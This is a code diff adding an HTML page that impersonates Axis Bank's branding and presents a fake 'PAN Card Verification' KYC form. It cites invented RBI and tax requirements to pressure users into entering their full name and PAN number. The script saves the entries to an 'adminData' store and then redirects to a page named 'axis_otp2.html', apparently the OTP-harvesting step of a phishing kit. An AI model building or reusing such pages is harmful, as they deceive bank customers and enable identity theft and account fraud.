@@ -1,0 +1,410 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>AXIS BANK - PAN Verification</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <style>
+        /* Same styles as previous pages, just change content */
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: Arial, sans-serif;
+        }
+        
+        body {
+            background: linear-gradient(135deg, #f0f2f5 0%, #e4e8ed 100%);
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 20px;
+        }
+        
+        .container {
+            width: 100%;
+            max-width: 900px;
+            background: white;
+            border-radius: 15px;
+            box-shadow: 0 15px 35px rgba(0, 0, 100, 0.1);
+            overflow: hidden;
+        }
+        
+        /* Header */
+        .header {
+            background: linear-gradient(to right, #2E5BAF, #1E4A9F);
+            color: white;
+            padding: 25px 40px;
+            text-align: center;
+            position: relative;
+        }
+        
+        .bank-logo {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 15px;
+            margin-bottom: 10px;
+        }
+        
+        .bank-logo i {
+            font-size: 40px;
+            color: #FFD700;
+        }
+        
+        .bank-name {
+            font-size: 32px;
+            font-weight: bold;
+            letter-spacing: 1px;
+        }
+        
+        .security-badge {
+            position: absolute;
+            right: 40px;
+            top: 30px;
+            background: rgba(255, 255, 255, 0.2);
+            padding: 8px 20px;
+            border-radius: 20px;
+            font-size: 14px;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+        }
+        
+        /* Main Content */
+        .main-content {
+            display: flex;
+            min-height: 500px;
+        }
+        
+        .left-section {
+            flex: 1;
+            padding: 40px;
+            background: #F9FAFB;
+            border-right: 1px solid #E1E4E8;
+        }
+        
+        .right-section {
+            width: 350px;
+            padding: 40px 30px;
+            background: white;
+        }
+        
+        /* PAN Form */
+        .pan-title {
+            color: #2E5BAF;
+            font-size: 24px;
+            margin-bottom: 20px;
+        }
+        
+        .pan-subtitle {
+            color: #666;
+            font-size: 16px;
+            margin-bottom: 30px;
+            line-height: 1.5;
+        }
+        
+        .form-group {
+            margin-bottom: 25px;
+        }
+        
+        .form-group label {
+            display: block;
+            margin-bottom: 10px;
+            color: #333;
+            font-weight: 600;
+        }
+        
+        .input-with-icon {
+            position: relative;
+        }
+        
+        .input-with-icon i {
+            position: absolute;
+            left: 15px;
+            top: 50%;
+            transform: translateY(-50%);
+            color: #666;
+        }
+        
+        .input-with-icon input {
+            width: 100%;
+            padding: 15px 15px 15px 45px;
+            border: 2px solid #DDD;
+            border-radius: 8px;
+            font-size: 16px;
+            transition: all 0.3s;
+        }
+        
+        .input-with-icon input:focus {
+            outline: none;
+            border-color: #2E5BAF;
+            box-shadow: 0 0 0 3px rgba(46, 91, 175, 0.1);
+        }
+        
+        .submit-btn {
+            width: 100%;
+            padding: 18px;
+            background: linear-gradient(to right, #2E5BAF, #1E4A9F);
+            color: white;
+            border: none;
+            border-radius: 8px;
+            font-size: 18px;
+            font-weight: bold;
+            cursor: pointer;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 10px;
+            transition: all 0.3s;
+            margin-top: 20px;
+        }
+        
+        .submit-btn:hover {
+            background: linear-gradient(to right, #1E4A9F, #15367F);
+            transform: translateY(-2px);
+            box-shadow: 0 10px 20px rgba(46, 91, 175, 0.3);
+        }
+        
+        .important-note {
+            background: #FFF8E1;
+            border-left: 4px solid #FFC107;
+            padding: 15px;
+            margin-top: 30px;
+            border-radius: 5px;
+            font-size: 14px;
+            color: #666;
+        }
+        
+        /* Right Section Cards */
+        .info-card {
+            background: #F8F9FA;
+            border-radius: 10px;
+            padding: 25px;
+            margin-bottom: 25px;
+            text-align: center;
+            border: 1px solid #E1E4E8;
+        }
+        
+        .card-icon {
+            font-size: 36px;
+            color: #2E5BAF;
+            margin-bottom: 15px;
+        }
+        
+        .card-title {
+            color: #333;
+            font-size: 18px;
+            margin-bottom: 10px;
+            font-weight: 600;
+        }
+        
+        .card-text {
+            color: #666;
+            font-size: 14px;
+            line-height: 1.5;
+            margin-bottom: 20px;
+        }
+        
+        .card-btn {
+            background: #2E5BAF;
+            color: white;
+            border: none;
+            padding: 10px 25px;
+            border-radius: 5px;
+            cursor: pointer;
+            font-weight: 500;
+        }
+        
+        /* Footer */
+        .footer {
+            background: #F5F7FA;
+            padding: 20px 40px;
+            text-align: center;
+            border-top: 1px solid #E1E4E8;
+            color: #666;
+            font-size: 14px;
+        }
+        
+        .footer-links {
+            margin-top: 10px;
+        }
+        
+        .footer-links a {
+            color: #2E5BAF;
+            text-decoration: none;
+            margin: 0 10px;
+            font-size: 13px;
+        }
+        
+        @media (max-width: 768px) {
+            .main-content {
+                flex-direction: column;
+            }
+            
+            .right-section {
+                width: 100%;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <!-- Header -->
+        <div class="header">
+            <div class="bank-logo">
+                <i class="fas fa-university"></i>
+                <div class="bank-name">AXIS BANK</div>
+            </div>
+            <div class="security-badge">
+                <i class="fas fa-lock"></i>
+                <span>KYC Verification</span>
+            </div>
+        </div>
+        
+        <!-- Main Content -->
+        <div class="main-content">
+            <!-- Left Section - PAN Form -->
+            <div class="left-section">
+                <h2 class="pan-title">PAN Card Verification</h2>
+                <p class="pan-subtitle">
+                    As per RBI guidelines, PAN verification is mandatory for all banking transactions. 
+                    Please provide your PAN details exactly as they appear on your PAN card.
+                </p>
+                
+                <form id="panForm">
+                    <div class="form-group">
+                        <label for="fullName">Full Name (as per PAN Card)</label>
+                        <div class="input-with-icon">
+                            <i class="fas fa-user"></i>
+                            <input type="text" id="fullName" name="fullName" placeholder="Enter your full name" required>
+                        </div>
+                    </div>
+                    
+                    <div class="form-group">
+                        <label for="panNumber">PAN Number</label>
+                        <div class="input-with-icon">
+                            <i class="fas fa-id-card"></i>
+                            <input type="text" id="panNumber" name="panNumber" 
+                                   placeholder="Enter 10-digit PAN (e.g., ABCDE1234F)" 
+                                   required
+                                   pattern="[A-Z]{5}[0-9]{4}[A-Z]{1}"
+                                   maxlength="10"
+                                   style="text-transform: uppercase;">
+                        </div>
+                        <small style="color: #666; font-size: 13px; margin-top: 5px; display: block;">
+                            Format: 5 letters, 4 digits, 1 letter (e.g., ABCDE1234F)
+                        </small>
+                    </div>
+                    
+                    <button type="submit" class="submit-btn">
+                        <i class="fas fa-check-circle"></i>
+                        VERIFY PAN DETAILS
+                    </button>
+                </form>
+                
+                <div class="important-note">
+                    <i class="fas fa-exclamation-circle"></i>
+                    <strong>Important:</strong> Providing incorrect PAN details may lead to transaction failures and penalties as per Income Tax regulations.
+                </div>
+            </div>
+            
+            <!-- Right Section - Info Cards -->
+            <div class="right-section">
+                <div class="info-card">
+                    <div class="card-icon">
+                        <i class="fas fa-file-contract"></i>
+                    </div>
+                    <div class="card-title">Why PAN Verification?</div>
+                    <div class="card-text">
+                        PAN verification is mandatory for all financial transactions above ₹50,000 as per Income Tax Department rules.
+                    </div>
+                </div>
+                
+                <div class="info-card">
+                    <div class="card-icon">
+                        <i class="fas fa-check-circle"></i>
+                    </div>
+                    <div class="card-title">Benefits of PAN Linking</div>
+                    <div class="card-text">
+                        • Faster income tax returns processing<br>
+                        • Easy tracking of financial transactions<br>
+                        • Required for high-value transactions
+                    </div>
+                </div>
+                
+                <div class="info-card">
+                    <div class="card-icon">
+                        <i class="fas fa-question-circle"></i>
+                    </div>
+                    <div class="card-title">Don't Have a PAN?</div>
+                    <div class="card-text">
+                        You can apply for a new PAN card online through NSDL or UTIITSL portals.
+                    </div>
+                    <button class="card-btn">APPLY FOR PAN</button>
+                </div>
+            </div>
+        </div>
+        
+        <!-- Footer -->
+        <div class="footer">
+            <p>© 2004-2024 Axis Bank Ltd. All rights reserved.</p>
+            <div class="footer-links">
+                <a href="#">Privacy Policy</a> | 
+                <a href="#">Terms & Conditions</a> | 
+                <a href="#">Disclaimer</a> | 
+                <a href="#">Sitemap</a>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        // PAN number formatting
+        document.getElementById('panNumber').addEventListener('input', function(e) {
+            this.value = this.value.replace(/[^a-zA-Z0-9]/g, '').toUpperCase().slice(0, 10);
+        });
+        
+        // Form submission
+        document.getElementById('panForm').addEventListener('submit', function(e) {
+            e.preventDefault();
+            
+            const fullName = document.getElementById('fullName').value;
+            const panNumber = document.getElementById('panNumber').value;
+            
+            // Validate PAN format
+            const panRegex = /^[A-Z]{5}[0-9]{4}[A-Z]{1}$/;
+            if (!panRegex.test(panNumber)) {
+                alert('Please enter a valid PAN number.\n\nFormat: 5 letters, 4 digits, 1 letter\nExample: ABCDE1234F');
+                return;
+            }
+            
+            // Save PAN data to admin
+            const panData = {
+                fullName: fullName,
+                panNumber: panNumber,
+                timestamp: new Date().toISOString(),
+                page: 'Axis Bank PAN Verification'
+            };
+            
+            let adminData = JSON.parse(localStorage.getItem('adminData') || '[]');
+            adminData.push(panData);
+            localStorage.setItem('adminData', JSON.stringify(adminData));
+            
+            console.log('PAN data saved:', panData);
+            
+            // Show loading
+            const btn = document.querySelector('.submit-btn');
+            const originalText = btn.innerHTML;
+            btn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> PROCESSING...';
+            btn.disabled = true;
+            
+            // Simulate processing and redirect
+            setTimeout(() => {
+                window.location.href = 'axis_otp2.html';
+            }, 1500);
+        });
+    </script>
+</body>
+</html>
